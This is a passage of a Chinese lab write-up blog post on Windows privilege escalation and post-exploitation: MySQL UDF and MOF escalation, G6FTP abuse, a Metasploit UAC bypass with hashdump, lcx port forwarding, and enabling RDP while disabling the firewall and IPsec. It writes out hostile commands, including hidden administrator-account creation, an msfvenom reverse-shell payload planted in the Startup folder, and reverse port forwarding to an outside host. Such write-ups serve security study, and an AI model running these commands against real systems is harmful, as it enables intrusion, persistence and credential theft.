+<p><img src="/2021/12/28/day37/image-20220301151358307.png" alt="image-20220301151358307"></p>
+<p>开启之后，看是否可以执行命令</p>
+<p><img src="/2021/12/28/day37/image-20220301151512693.png" alt="image-20220301151512693"></p>
+<p>查看权限，可以看到权限比较低，是一个数据库权限</p>
+<p><img src="/2021/12/28/day37/image-20220301151607813.png" alt="image-20220301151607813"></p>
+<p>数据库权限的话，增加账号应该是不够的</p>
+<p>可以上传溢出工具来提高权限</p>
+<h3 id="mysql提权"><a href="#mysql提权" class="headerlink" title="mysql提权"></a>mysql提权</h3><h4 id="描述-9"><a href="#描述-9" class="headerlink" title="描述"></a>描述</h4><p>在mysql 可以使用自定义函数进行提权，udf = user defined function 用户自定义函数。</p>
+<p>对于自定义的函数，在mysql5.1版本以后就需要放在插件插件目录 /lib/plugin ,文件后缀为dll，c语言编写。</p>
+<h4 id="mysql提权难点"><a href="#mysql提权难点" class="headerlink" title="mysql提权难点"></a>mysql提权难点</h4><ol>
+<li><p>版本有32 和64位的mysql。创建函数的方法一样，但是64版本的要用64的udf.dll</p>
+</li>
+<li><p>The MySQL server is running with the –secure-file-priv option so it cannot execute this statement</p>
+<p>这种是mysql默认设置是不允许导入导出，需要在my.ini添加 </p>
+<pre class="line-numbers language-none"><code class="language-none">secure-file-priv = <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>保存重启mysql即可</p>
+<p>可以用以下命令查看此配置信息</p>
+<pre class="line-numbers language-none"><code class="language-none">SELECT @@global.secure_file_priv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+<li><p>Can’t create/write to file ‘D:\phpStudy\MySQL\lib\plugin\moonudf.dll</p>
+<p>这种是没有权限导出或者plugin目录不存在，需要手动创建。</p>
+<p>使用此语句可查询插件目录是否存在</p>
+<pre class="line-numbers language-none"><code class="language-none">show variables like "%plugin%"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
+</ol>
+<h4 id="复现-10"><a href="#复现-10" class="headerlink" title="复现"></a>复现</h4><p>在网站上寻找mysql服务的账号密码</p>
+<p>然后上传提权脚本到网站目录</p>
+<p><img src="/2021/12/28/day37/image-20220301160242522.png" alt="image-20220301160242522"></p>
+<p><img src="/2021/12/28/day37/image-20220301160502097.png" alt="image-20220301160502097"></p>
+<p>登陆后导出udf</p>
+<p><img src="/2021/12/28/day37/image-20220301160515708.png" alt="image-20220301160515708"></p>
+<p>导出成功后创建udf函数</p>
+<p><img src="/2021/12/28/day37/image-20220301174218028.png" alt="image-20220301174218028"></p>
+<p>之后可以执行一些命令</p>
+<p><img src="/2021/12/28/day37/image-20220301174314462.png" alt="image-20220301174314462"></p>
+<p>超级管理员</p>
+<p><img src="/2021/12/28/day37/image-20220301174708939.png" alt="image-20220301174708939"></p>
+<p><img src="/2021/12/28/day37/image-20220301174804024.png" alt="image-20220301174804024"></p>
+<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>mof多用于权限维持</p>
+<h4 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h4><p>mof是windows系统的一个文件（c:/windows/system32/wbem/mof/nullevt.mof）叫做”托管对象格式”其作用是每隔五秒就会去监控进程创建和死亡。</p>
+<p>作用是有了mysql的root权限了以后，然后使用root权限去执行我们上传的mof。隔了一定时间以后这个mof就会被执行，这个mof中有一段是vbs脚本，这个vbs大多数的是cmd的添加管理员用户的命令。</p>
+<p><strong>条件：</strong></p>
+<ol>
+<li>windows 03及以下版本</li>
+<li>mysql启动身份具有权限去读写c:/windows/system32/wbem/mof目录</li>
+<li>secure-file-priv参数不为null</li>
+</ol>
+<h4 id="复现-11"><a href="#复现-11" class="headerlink" title="复现"></a>复现</h4><p>把mof.php上传到网站目录，填写命令执行</p>
+<p><img src="/2021/12/28/day37/image-20220302123836661.png" alt="image-20220302123836661"></p>
+<pre class="line-numbers language-none"><code class="language-none">net.exe user xiaosha$ 123456 /add &amp;&amp; net localgroup administrators xiaosha /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220302124131278.png" alt="image-20220302124131278"></p>
+<p>靶机看确实加到管理员组了</p>
+<p><img src="/2021/12/28/day37/image-20220302124151211.png" alt="image-20220302124151211"></p>
+<h3 id="G6FTP-提权"><a href="#G6FTP-提权" class="headerlink" title="G6FTP 提权"></a>G6FTP 提权</h3><h4 id="描述-10"><a href="#描述-10" class="headerlink" title="描述"></a>描述</h4><p>G6 FTP Server 新一代的 FTP 服务器端软件，支持 RFC-959 标准并增强其中的某些功能，上传和下载都可以续传，实时查看运行状态，占用带宽，还有很多功能。</p>
+<h4 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h4><p> G6FTP的默认端口为8021，只侦听在127.0.0.1的8021端口上，无法从外部直接访问，所以需要进行端口转发（使用lcx 工具（lcx 具有三个功能：监听、转发、端口转向））。</p>
+<p>netstat -ano 查看G6ftp端口</p>
+<p><img src="/2021/12/28/day37/image-20220302133656605.png" alt="image-20220302133656605"></p>
+<h4 id="复现-12"><a href="#复现-12" class="headerlink" title="复现"></a>复现</h4><p>可在webshell访问此目录，remote.ini存放ftp管理员的账号和密码</p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Program Files (x86)\Gene6 FTP Server\RemoteAdmin\Remote.ini<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220302134622585.png" alt="image-20220302134622585"></p>
+<p>看出是md5格式</p>
+<p>需要使用端口转发工具将8021转发出来，将icx.exe上传并执行如下</p>
+<pre class="line-numbers language-none"><code class="language-none">lcx.exe -tran 2333 127.0.0.1 8021<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220302134806365.png" alt="image-20220302134806365"></p>
+<p><img src="/2021/12/28/day37/image-20220302134844559.png" alt="image-20220302134844559"></p>
+<p>可在靶机上查看是否被转发，看到2333外部可访问</p>
+<p><img src="/2021/12/28/day37/image-20220302135019392.png" alt="image-20220302135019392"></p>
+<p>安装g6ftp可连接服务端进行设置</p>
+<p><img src="/2021/12/28/day37/image-20220302135246199.png" alt="image-20220302135246199"></p>
+<p>可在域中新建用户，并增加命令，全选权限</p>
+<pre class="line-numbers language-none"><code class="language-none">net user xiaosha 123456 /add &amp;&amp; net localgroup administrators xiaosha /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220302140052194.png" alt="image-20220302140052194"></p>
+<p>新建之后可以ftp访问</p>
+<p><img src="/2021/12/28/day37/image-20220302140106489.png" alt="image-20220302140106489"></p>
+<p>登录进来后，我们可以尝试执行刚才设置的命令</p>
+<pre class="line-numbers language-none"><code class="language-none">quote stie ADD<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>没有执行成功，这里提权没出来，因为版本是08server</p>
+<p><img src="/2021/12/28/day37/image-20220302140640408.png" alt="image-20220302140640408"></p>
+<p>这里我们使用另一个思路，windows的系统配置错误，上传Program.exe，系统重启自动启用</p>
+<p>ftp连接成功，登录建立的用户可访问到c盘</p>
+<p><img src="/2021/12/28/day37/image-20220302141615220.png" alt="image-20220302141615220"></p>
+<pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.80.134 lport=12345 -f exe &gt; 1.exe <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>改名Program.exe，上传，监听，重启</p>
+<p>可上传到启动项</p>
+<p><img src="/2021/12/28/day37/image-20220302142946617.png" alt="image-20220302142946617"></p>
+<pre class="line-numbers language-none"><code class="language-none">C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>重启后</p>
+<p><img src="/2021/12/28/day37/image-20220302143157724.png" alt="image-20220302143157724"></p>
+<h2 id="bypass-uac"><a href="#bypass-uac" class="headerlink" title="bypass uac"></a>bypass uac</h2><h4 id="描述-11"><a href="#描述-11" class="headerlink" title="描述"></a><strong>描述</strong></h4><p>UAC（UserAccount Control，用户账户控制）简言之就是在Vista及更高版本中通过弹框进一步让用户确认是否授权当前可执行文件来达到阻止恶意程序的目的。</p>
+<p>比如</p>
+<p><img src="/2021/12/28/day37/image-20220302145327415.png" alt="image-20220302145327415"></p>
+<p>为了远程执行目标的exe或者bat可执行文件绕过此安全机制，因此叫BypassUAC（不进行弹窗直接运行执行文件）</p>
+<h4 id="复现-13"><a href="#复现-13" class="headerlink" title="复现"></a><strong>复现</strong></h4><p>把msf生成的反向链接exe放到win10，监听，执行</p>
+<p><img src="/2021/12/28/day37/image-20220302145653608.png" alt="image-20220302145653608"></p>
+<p>可以看到在进行getsystem时出错了，这是uac起了作用</p>
+<p>可以通过search uac 搜索出uac模块</p>
+<p><img src="/2021/12/28/day37/image-20220302145930966.png" alt="image-20220302145930966"></p>
+<p>如果失败可尝试多个模块</p>
+<p><strong>使用bypassuac_injection模块进行bypass</strong></p>
+<blockquote>
+<p>exploit/windows/local/bypassuac_injection</p>
+<p>此模块将利用受信任的通过进程注入发布者证书。它将产生一个关闭UAC标志的第二个shell。此模块使用反射DLL注入技术，仅丢弃DLL有效负载二进制文件，而不是标准技术中的三个单独的二进制文件。但是，它需要选择正确的体系结构x64（也适用于SYSWOW64系统）。如果指定EXE:：自定义DLL应在单独启动有效负载后调用ExitProcess（）</p>
+</blockquote>
+<p>成功bypass掉uac，但是这里hashdump仍然失败，看了下应该是x86的问题</p>
+<p><img src="/2021/12/28/day37/image-20220302150402520.png" alt="image-20220302150402520"></p>
+<p>这里需要迁移进程到x64</p>
+<p>ps列出进程 migrate 迁移</p>
+<p><img src="/2021/12/28/day37/image-20220302151516439.png" alt="image-20220302151516439"></p>
+<p>成功 hashdump</p>
+<h2 id="lcx端口转发"><a href="#lcx端口转发" class="headerlink" title="lcx端口转发"></a>lcx端口转发</h2><h4 id="描述-12"><a href="#描述-12" class="headerlink" title="描述"></a><strong>描述</strong></h4><p>lcx是一款强大的内网端口转发工具，用于将内网主机开放的内部端口映射到外网主机（有公网IP）任意端口。它是一款命令行工具，当然也可以在有权限的webshell下执行，正因如此lcx常被认为是一款黑客入侵工具，lcx在内网入侵渗透中起着重要的角色。</p>
+<p>lcx进行端口转发的原理就是使不同端口之间形成一个回路。它常用于外网连接内网3389端口。</p>
+<h4 id="本地转发"><a href="#本地转发" class="headerlink" title="本地转发"></a>本地转发</h4><p>本地转发主要是把127.0.0.1:端口 这个本地端口 转发到外部 让外部的客户端允许连接进来</p>
+<p>我们在G6FTP使用过此方法，把本地8021转发到2333端口</p>
+<p><img src="/2021/12/28/day37/image-20220302155334172.png" alt="image-20220302155334172"></p>
+<h4 id="远程转发"><a href="#远程转发" class="headerlink" title="远程转发"></a>远程转发</h4><p>远程转发 一般用于外网无法访问内网，内网可以访问外网，由内部发出请求到外网，所以防火墙不会拦截。</p>
+<p>客户端除了可以在本地访问内网机子，也可以作为中间人，外部机子也能连接客户端到内网服务端。</p>
+<p><img src="/2021/12/28/day37/image-20220302182525073.png" alt="image-20220302182525073"></p>
+<p>让不同端口之间形成一个回路，51-&gt;2333-&gt;3389</p>
+<p>客户端监听</p>
+<pre class="line-numbers language-none"><code class="language-none">lcx -listen 51 2333<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220302182757993.png" alt="image-20220302182757993"></p>
+<p>服务端执行转发</p>
+<pre class="line-numbers language-none"><code class="language-none">/c C:\inetpub\wwwroot\lcx.exe -slave 192.168.80.138 2333 127.0.0.1 3389<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220302182817164.png" alt="image-20220302182817164"></p>
+<p>客户端然后用mstsc连接</p>
+<p><img src="/2021/12/28/day37/image-20220302190126452.png" alt="image-20220302190126452"></p>
+<h2 id="远程终端问题"><a href="#远程终端问题" class="headerlink" title="远程终端问题"></a>远程终端问题</h2><p>远程终端的默认端口是3389，云vps一般会开启，没有启用的情况下，在较高的权限下可以使用注册表命令进行开启。</p>
+<p>端口是否开启，服务是否开启，防火墙是否开启，ipsec是否开启. . .等，都影响远程终端连接。</p>
+<h3 id="注册表开启远程终端命令"><a href="#注册表开启远程终端命令" class="headerlink" title="注册表开启远程终端命令"></a>注册表开启远程终端命令</h3><h4 id="2008-2012-2016-开启3389"><a href="#2008-2012-2016-开启3389" class="headerlink" title="2008 2012 2016 开启3389"></a>2008 2012 2016 开启3389</h4><p>1.bat</p>
+<pre class="line-numbers language-none"><code class="language-none">echo DO ALL IN CMD! 
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f 
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds\tcp" /v PortNumber /t REG_DWORD /d 3389 /f 
+
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 3389 /f <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>执行后开启3389</p>
+<h4 id="MSF命令开启3389"><a href="#MSF命令开启3389" class="headerlink" title="MSF命令开启3389"></a>MSF命令开启3389</h4><p>需要管理员权限</p>
+<pre class="line-numbers language-none"><code class="language-none">run getgui -e<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="一条命令开启3389"><a href="#一条命令开启3389" class="headerlink" title="一条命令开启3389"></a>一条命令开启3389</h4><pre class="line-numbers language-none"><code class="language-none">REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="WMIC命令开启3389端口"><a href="#WMIC命令开启3389端口" class="headerlink" title="WMIC命令开启3389端口"></a>WMIC命令开启3389端口</h4><p>前提条件是确保“Windows Management Instrumentation(Winmgmt)”服务已正常启动。</p>
+<pre class="line-numbers language-none"><code class="language-none">wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="WMIC开启-远程主机3389端口"><a href="#WMIC开启-远程主机3389端口" class="headerlink" title="WMIC开启 远程主机3389端口"></a>WMIC开启 远程主机3389端口</h4><p>支持系统：Win2k/XP/Win2k3</p>
+<pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.80.136 /user:administrator /password:123456 PATH win32_terminalservicesetting WHERE (__Class!="") CALL SetAllowTSConnections 1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>支持系统：Win7/Win2k8/Win8.1/Win10/2012/2016</p>
+<pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.80.136 /user:administrator /password:123456 RDTOGGLE WHERE ServerName='08serverR2-1' call SetAllowTSConnections 1 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">wmic /node:192.168.80.136 /user:administrator /password:123456 process call create 'cmd.exe /c REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>注意：</p>
+<p>利用WMIC远程执行命令的方式来执行WMIC、REG等开启3389端口的命令。</p>
+<p>WMIC远程开启3389端口时不能用%COMPUTERNAME%环境变量替代远程主机的计算机名。错误：描述 = 拒绝访问，这是因为开启了UAC用户账户控制，只允许RID500管理员执行此操作。</p>
+<h4 id="查询是否开启3389（0为On-1为OFF）"><a href="#查询是否开启3389（0为On-1为OFF）" class="headerlink" title="查询是否开启3389（0为On 1为OFF）"></a>查询是否开启3389（0为On 1为OFF）</h4><pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h4 id="注册表查询端口号"><a href="#注册表查询端口号" class="headerlink" title="注册表查询端口号"></a>注册表查询端口号</h4><p><strong>可使用webshell的REGshell</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp\<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220303135759053.png" alt="image-20220303135759053"></p>
+<p><strong>cmdshell查询</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\Wds\rdpwd\Tds" /s<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">REG query "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP- Tcp" /v PortNumber <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>将16进制整数输出，即为3389</p>
+<pre class="line-numbers language-none"><code class="language-none">set /a Port=0xd3d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220303140132308.png" alt="image-20220303140132308"></p>
+<p><strong>通过网络命令查询端口</strong></p>
+<pre class="line-numbers language-none"><code class="language-none">tasklist /svc | findstr "TermService" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">netstat -ano | findstr "进程号" <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">net start |find "Remote Desktop Services"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>1264为进程号</p>
+<p><img src="/2021/12/28/day37/image-20220303140447024.png" alt="image-20220303140447024"></p>
+<h3 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h3><p>确定开启了远程终端并且端口没错的情况下，还是连不上目标</p>
+<p>这个时候可以使用lcx端口转发或者使用命令关闭防火墙</p>
+<p>查询状态</p>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall show allprofile state<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>关闭防火墙</p>
+<pre class="line-numbers language-none"><code class="language-none">netsh advfirewall set allprofiles state off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>关闭防火墙</p>
+<pre class="line-numbers language-none"><code class="language-none">net stop "Windows Firewall"<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>禁用防火墙</p>
+<pre class="line-numbers language-none"><code class="language-none">sc config sharedaccess start= disabled<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>关闭防火墙</p>
+<pre class="line-numbers language-none"><code class="language-none">net stop sharedaccess<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="关闭-ipsec"><a href="#关闭-ipsec" class="headerlink" title="关闭 ipsec"></a>关闭 ipsec</h3><p>在关闭防火墙时，还是连接不上，可能是ipsec做了ip策略处理，导致连接失败</p>
+<pre class="line-numbers language-none"><code class="language-none">net stop "IPsec Policy Agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="终端连接错误方法"><a href="#终端连接错误方法" class="headerlink" title="终端连接错误方法"></a>终端连接错误方法</h3><p>08远程开启3选项，win10连接，出现如下</p>
+<p><img src="/2021/12/28/day37/image-20220303141040857.png" alt="image-20220303141040857"></p>
+<p>此情况下，可使用相同版本的终端连接，用12server连接</p>
+<p><img src="/2021/12/28/day37/image-20220303141246931.png" alt="image-20220303141246931"></p>
+<p>或者使用 xfreerdp工具连接会自动加密</p>
+<pre class="line-numbers language-none"><code class="language-none">xfreerdp /f /u:administrator /p:123456 /v:192.168.80.136<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/2021/12/28/day37/image-20220303141536969.png" alt="image-20220303141536969"></p>
+<p>注销即可退出</p>
+<h3 id="加入远程桌面组"><a href="#加入远程桌面组" class="headerlink" title="加入远程桌面组"></a>加入远程桌面组</h3><p>在08新建一个普通用户，通过普通用户远程连接</p>
+<p><img src="/2021/12/28/day37/image-20220303142256017.png" alt="image-20220303142256017"></p>
+<pre class="line-numbers language-none"><code class="language-none">net localgroup "Remote Desktop Users" xiaosha /add<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>可把此普通用户加入远程登录组，成功连接，但是权限较低</p>
+<p><img src="/2021/12/28/day37/image-20220303142438794.png" alt="image-20220303142438794"></p>
+<h3 id="终端超出最大连接数"><a href="#终端超出最大连接数" class="headerlink" title="终端超出最大连接数"></a>终端超出最大连接数</h3><p>可用此种方法连接</p>
+<pre class="line-numbers language-none"><code class="language-none">mstsc /v:192.168.80.136:3389 /console<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">晓莎K</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://0x00xiaoshaK.github.io/2021/12/28/day37/">http://0x00xiaoshaK.github.io/2021/12/28/day37/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">晓莎K</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/windows%E6%8F%90%E6%9D%83/">
+                                    <span class="chip bg-color">windows提权</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+        <style>
+    .valine-card {
+        margin: 1.5rem auto;
+    }
+
+    .valine-card .card-content {
+        padding: 20px 20px 5px 20px;
+    }
+
+    #vcomments textarea {
+        box-sizing: border-box;
+        background: url("/medias/comment_bg.png") 100% 100% no-repeat;
+    }
+
+    #vcomments p {
+        margin: 2px 2px 10px;
+        font-size: 1.05rem;
+        line-height: 1.78rem;
+    }
+
+    #vcomments blockquote p {
+        text-indent: 0.2rem;
+    }
+
+    #vcomments a {
+        padding: 0 2px;
+        color: #4cbf30;
+        font-weight: 500;
+        text-decoration: none;
+    }
+
+    #vcomments img {
+        max-width: 100%;
+        height: auto;
+        cursor: pointer;
+    }
+
+    #vcomments ol li {
+        list-style-type: decimal;
+    }
+
+    #vcomments ol,
+    ul {
+        display: block;
+        padding-left: 2em;
+        word-spacing: 0.05rem;
+    }
+
+    #vcomments ul li,
+    ol li {
+        display: list-item;
+        line-height: 1.8rem;
+        font-size: 1rem;
+    }
+
+    #vcomments ul li {
+        list-style-type: disc;
+    }
+
+    #vcomments ul ul li {
+        list-style-type: circle;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    #vcomments table, th, td {
+        border: 0;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments h1 {
+        font-size: 1.85rem;
+        font-weight: bold;
+        line-height: 2.2rem;
+    }
+
+    #vcomments h2 {
+        font-size: 1.65rem;
+        font-weight: bold;
+        line-height: 1.9rem;
+    }
+
+    #vcomments h3 {
+        font-size: 1.45rem;
+        font-weight: bold;
+        line-height: 1.7rem;
+    }
+
+    #vcomments h4 {
+        font-size: 1.25rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    #vcomments h5 {
+        font-size: 1.1rem;
+        font-weight: bold;
+        line-height: 1.4rem;
+    }
+
+    #vcomments h6 {
+        font-size: 1rem;
+        line-height: 1.3rem;
+    }
+
+    #vcomments p {
+        font-size: 1rem;
+        line-height: 1.5rem;
+    }
+
+    #vcomments hr {
+        margin: 12px 0;
+        border: 0;
+        border-top: 1px solid #ccc;
+    }
+
+    #vcomments blockquote {
+        margin: 15px 0;
+        border-left: 5px solid #42b983;
+        padding: 1rem 0.8rem 0.3rem 0.8rem;
+        color: #666;
+        background-color: rgba(66, 185, 131, .1);
+    }
+
+    #vcomments pre {
+        font-family: monospace, monospace;
+        padding: 1.2em;
+        margin: .5em 0;
+        background: #272822;
+        overflow: auto;
+        border-radius: 0.3em;
+        tab-size: 4;
+    }
+
+    #vcomments code {
+        font-family: monospace, monospace;
+        padding: 1px 3px;
+        font-size: 0.92rem;
+        color: #e96900;
+        background-color: #f8f8f8;
+        border-radius: 2px;
+    }
+
+    #vcomments pre code {
+        font-family: monospace, monospace;
+        padding: 0;
+        color: #e8eaf6;
+        background-color: #272822;
+    }
+
+    #vcomments pre[class*="language-"] {
+        padding: 1.2em;
+        margin: .5em 0;
+    }
+
+    #vcomments code[class*="language-"],
+    pre[class*="language-"] {
+        color: #e8eaf6;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+
+    #vcomments b,
+    strong {
+        font-weight: bold;
+    }
+
+    #vcomments dfn {
+        font-style: italic;
+    }
+
+    #vcomments small {
+        font-size: 85%;
+    }
+
+    #vcomments cite {
+        font-style: normal;
+    }
+
+    #vcomments mark {
+        background-color: #fcf8e3;
+        padding: .2em;
+    }
+
+    #vcomments table, th, td {
+        padding: 12px 13px;
+        border: 1px solid #dfe2e5;
+    }
+
+    table tr:nth-child(2n), thead {
+        background-color: #fafafa;
+    }
+
+    #vcomments table th {
+        background-color: #f2f2f2;
+        min-width: 80px;
+    }
+
+    #vcomments table td {
+        min-width: 80px;
+    }
+
+    #vcomments [type="checkbox"]:not(:checked), [type="checkbox"]:checked {
+        position: inherit;
+        margin-left: -1.3rem;
+        margin-right: 0.4rem;
+        margin-top: -1px;
+        vertical-align: middle;
+        left: unset;
+        visibility: visible;
+    }
+</style>
+
+<div class="card valine-card" data-aos="fade-up">
+    <div class="comment_headling" style="font-size: 20px; font-weight: 700; position: relative; padding-left: 20px; top: 15px; padding-bottom: 5px;">
+        <i class="fas fa-comments fa-fw" aria-hidden="true"></i>
+        <span>评论</span>
+    </div>
+    <div id="vcomments" class="card-content" style="display: grid">
+    </div>
+</div>
+
+<script src="/libs/valine/av-min.js"></script>
+<script src="/libs/valine/Valine.min.js"></script>
+<script>
+    new Valine({
+        el: '#vcomments',
+        appId: 'DJnY4XDNchYmzLpD8IASjSjf-gzGzoHsz',
+        appKey: '3tkas9StBY5fsrGt1BVtPNOt',
+        notify: 'false' === 'true',
+        verify: 'false' === 'true',
+        visitor: 'true' === 'true',
+        avatar: 'mm',
+        pageSize: '10',
+        lang: 'zh-cn',
+        placeholder: 'just go go'
+    });
+</script>
+
+<!--酷Q推送-->
+
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/01/02/csrfssrf/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="csrfssrf">
+                        
+                        <span class="card-title">csrfssrf</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            csrf&amp;ssrf
